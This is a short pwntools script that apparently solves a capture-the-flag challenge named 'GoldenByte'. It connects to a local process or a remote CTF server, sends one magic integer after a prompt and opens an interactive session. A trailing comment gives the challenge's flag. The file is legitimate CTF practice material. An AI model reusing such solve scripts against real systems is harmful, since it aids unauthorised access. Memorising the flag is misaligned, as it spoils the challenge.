#!/usr/bin/env python3

from pwn import *

exe = ELF("./GoldenByte_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("ctf.mf.grsu.by", 9074)

    return r


def main():
    r = conn()
    r.recvuntil(b": >")
    r.sendline(str(0xBEE0FDE9))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
# grodno{D4dy4_m4TV31_Pr019r4l_kV4rT1RY_V_K421n0_V3D_n3_2N4L_PWN}